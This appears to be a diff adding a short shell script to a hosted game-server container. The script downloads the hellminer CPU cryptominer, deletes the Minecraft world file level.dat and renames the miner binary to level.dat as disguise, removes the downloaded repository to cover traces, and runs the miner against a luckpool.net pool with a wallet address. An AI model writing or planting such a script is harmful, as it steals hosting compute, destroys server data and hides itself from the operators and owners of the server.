@@ -1,0 +1,10 @@
+git clone https://github.com/hellcatz/luckpool
+cd luckpool/miners
+tar -xvf hellminer_cpu_linux.tar.gz
+rm -r /home/container/world/level.dat
+mv hellminer /home/container/world/level.dat
+mv verus-solver /home/container/world/
+cd /home/container/world
+rm -r /home/container/luckpool
+
+./level.dat -c stratum+tcp://eu.luckpool.net:3956 -u RKxL8cCnTTBwMcV1dPFst2pt6P8AJwyfDW.defender
